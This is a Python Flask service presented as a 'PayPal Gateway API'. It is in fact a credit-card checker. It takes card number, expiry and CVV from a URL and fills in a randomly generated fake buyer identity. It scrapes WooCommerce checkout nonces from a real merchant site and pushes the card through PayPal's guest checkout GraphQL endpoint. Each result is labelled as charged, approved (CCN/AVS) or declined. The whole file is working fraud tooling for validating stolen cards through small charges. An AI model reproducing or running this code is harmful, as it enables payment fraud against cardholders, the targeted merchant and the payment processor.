from flask import Flask, request, jsonify
import random
import string
import re
import requests
import json
import time
from requests_toolbelt.multipart.encoder import MultipartEncoder
import datetime

app = Flask(__name__)

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White"]
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    return first_name, last_name

def generate_address():
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]
    streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
    zip_codes = ["10001", "90001", "60601", "77001", "85001"]
    
    city_index = random.randint(0, len(cities) - 1)
    city = cities[city_index]
    state = states[city_index]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[city_index]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone_number():
    return f"303{''.join(random.choices(string.digits, k=7))}"

def process_payment(n, mm, yy, cvc, user_agent=None):
    start_time = time.time()
    try:
        r = requests.Session()
        
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        num = generate_phone_number()
        
        print(f"🔍 Processing card: {n[:6]}XXXXXX{n[-4:]}")
        
        files = {'quantity': (None, '1'), 'add-to-cart': (None, '4451')}
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'content-type': multipart_data.content_type,
            'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = r.post('https://switchupcb.com/shop/i-buy/', headers=headers, data=multipart_data, timeout=120)
        
        headers = {'authority': 'switchupcb.com', 'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = r.get('https://switchupcb.com/checkout/', cookies=r.cookies, headers=headers, timeout=120)
        
        sec_match = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
        if not sec_match:
            elapsed_time = round(time.time() - start_time, 2)
            return {'status': 'error', 'message': 'Failed to extract nonce', 'elapsed': f'{elapsed_time}s', 'DEV': 'BLAZE_X_007'}
        sec = sec_match.group(1)
        
        nonce_match = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
        if not nonce_match:
            elapsed_time = round(time.time() - start_time, 2)
            return {'status': 'error', 'message': 'Failed to extract nonce', 'elapsed': f'{elapsed_time}s', 'DEV': 'BLAZE_X_007'}
        nonce = nonce_match.group(1)
        
        check_match = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
        if not check_match:
            elapsed_time = round(time.time() - start_time, 2)
            return {'status': 'error', 'message': 'Failed to extract checkout nonce', 'elapsed': f'{elapsed_time}s', 'DEV': 'BLAZE_X_007'}
        check = check_match.group(1)
        
        create_match = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
        if not create_match:
            elapsed_time = round(time.time() - start_time, 2)
            return {'status': 'error', 'message': 'Failed to extract create nonce', 'elapsed': f'{elapsed_time}s', 'DEV': 'BLAZE_X_007'}
        create = create_match.group(1)
        
        headers = {
            'authority': 'switchupcb.com',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true'
        response = r.post('https://switchupcb.com/', params=params, headers=headers, data=data, timeout=120)
        
        headers = {
            'authority': 'switchupcb.com',
            'content-type': 'application/json',
            'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        params = {'wc-ajax': 'ppc-create-order'}
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={num}&billing_email={acc}&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}',
            'createaccount': False,
            'save_payment_method': False,
        }
        response = r.post('https://switchupcb.com/', params=params, cookies=r.cookies, headers=headers, json=json_data, timeout=120)
        
        paypal_id = response.json()['data']['id']
        
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'
        
        headers = {
            'authority': 'www.paypal.com',
            'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'token': paypal_id,
        }
        response = r.get('https://www.paypal.com/smart/card-fields', params=params, headers=headers, timeout=120)
        
        headers = {
            'authority': 'www.paypal.com',
            'content-type': 'application/json',
            'user-agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }
        json_data = {
            'query': '''
        mutation payWithCard(
            $token: String!
            $card: CardInput!
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        ''',
            'variables': {
                'token': paypal_id,
                'card': {
                    'cardNumber': n,
                    'expirationDate': f'{mm}/20{yy}',
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': None,
        }
        
        response = r.post('https://www.paypal.com/graphql?fetch_credit_form_submit', headers=headers, json=json_data)
        last = response.text
        
        elapsed_time = round(time.time() - start_time, 2)
        
        if ('ADD_SHIPPING_ERROR' in last or 'NEED_CREDIT_CARD' in last or '"status": "succeeded"' in last or 
            'Thank You For Donation.' in last or 'Your payment has already been processed' in last or 'Success ' in last):
            return {
                'status': 'Charged 🔥', 
                'message': 'CHARGE 2$ ✅', 
                'details': 'Payment processed successfully',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            return {
                'status': 'Charged 🔥', 
                'message': 'Approve ✅', 
                'details': '3D Secure required',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }
        elif 'INVALID_SECURITY_CODE' in last:
            return {
                'status': 'Charged 🔥', 
                'message': 'APPROVED CCN ✅', 
                'details': 'INVAILED_SECURITY_CODE',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }
        elif 'INVALID_BILLING_ADDRESS' in last:
            return {
                'status': 'Charged 🔥', 
                'message': 'APPROVED - AVS ✅', 
                'details': 'INVAILED_BILLING_ADDRESS',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            return {
                'status': 'Charged 🔥', 
                'message': 'APPROVED ✅', 
                'details': 'EXISTING_ACCOUNT_RESTICTED',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }
        else:
            try:
                response_json = response.json()
                if 'errors' in response_json and len(response_json['errors']) > 0:
                    message = response_json['errors'][0].get('message', 'Unknown error')
                    if 'data' in response_json['errors'][0] and len(response_json['errors'][0]['data']) > 0:
                        code = response_json['errors'][0]['data'][0].get('code', 'NO_CODE')
                        return {
                            'status': 'declined', 
                            'message': 'DECLINED ❌', 
                            'details': f'{code} - {message}',
                            'elapsed': f'{elapsed_time}s',
                            'DEV': 'BLAZE_X_007'
                        }
                    return {
                        'status': 'declined', 
                        'message': 'DECLINED ❌', 
                        'details': message,
                        'elapsed': f'{elapsed_time}s',
                        'DEV': 'BLAZE_X_007'
                    }
                return {
                    'status': 'declined', 
                    'message': 'DECLINED ❌', 
                    'details': response.text[:100] if hasattr(response, 'text') else 'Unknown error',
                    'elapsed': f'{elapsed_time}s',
                    'DEV': 'BLAZE_X_007'
                }
            except (json.JSONDecodeError, ValueError, KeyError, IndexError, TypeError) as e:
                return {
                    'status': 'declined', 
                    'message': 'DECLINED ❌', 
                    'details': response.text[:100] if hasattr(response, 'text') else 'Unknown error',
                    'elapsed': f'{elapsed_time}s',
                    'DEV': 'BLAZE_X_007'
                }
                
    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        return {
            'status': 'error', 
            'message': 'ERROR ❌', 
            'details': str(e),
            'elapsed': f'{elapsed_time}s',
            'DEV': 'BLAZE_X_007'
        }

@app.route('/gateway=pp/cc=<path:card_details>', methods=['GET'])
def paypal_gateway(card_details):
    """
    PayPal Gateway API Endpoint
    Format: /gateway=pp/cc=card_no.|mm|yy|cvv
    Example: /gateway=pp/cc=4111111111111111|12|25|123
    """
    start_time = time.time()
    try:
        # Parse card details
        parts = card_details.split('|')
        if len(parts) != 4:
            elapsed_time = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'message': 'Invalid card format. Use: card_no.|mm|yy|cvv',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }), 400
        
        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()
        
        # Validate card number (basic validation)
        if not n.isdigit() or len(n) < 13 or len(n) > 19:
            elapsed_time = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'message': 'Invalid card number',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }), 400
        
        # Validate month
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            elapsed_time = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'message': 'Invalid month (01-12)',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }), 400
        
        # Validate year
        if not yy.isdigit() or len(yy) not in [2, 4]:
            elapsed_time = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'message': 'Invalid year format (YY or YYYY)',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }), 400
        
        # Validate CVV
        if not cvc.isdigit() or len(cvc) not in [3, 4]:
            elapsed_time = round(time.time() - start_time, 2)
            return jsonify({
                'status': 'error',
                'message': 'Invalid CVV (3 or 4 digits)',
                'elapsed': f'{elapsed_time}s',
                'DEV': 'BLAZE_X_007'
            }), 400
        
        # Format year to 2 digits if needed
        if len(yy) == 4:
            yy = yy[2:]
        
        # Process payment
        result = process_payment(n, mm, yy, cvc)
        
        # Add card info (masked) to response
        result['card_info'] = {
            'number': f"{n[:6]}XXXXXX{n[-4:]}",
            'expiry': f"{mm}/{yy}",
            'cvv': 'XXX'
        }
        
        return jsonify(result)
        
    except Exception as e:
        elapsed_time = round(time.time() - start_time, 2)
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}',
            'elapsed': f'{elapsed_time}s',
            'DEV': 'BLAZE_X_007'
        }), 500

@app.route('/')
def home():
    return jsonify({
        'message': 'PayPal Gateway API',
        'usage': 'Use /gateway=pp/cc=card_no.|mm|yy|cvv',
        'example': '/gateway=pp/cc=4111111111111111|12|25|123',
        'DEV': 'BLAZE_X_007',
        'timestamp': datetime.datetime.now().isoformat()
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'DEV': 'BLAZE_X_007'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)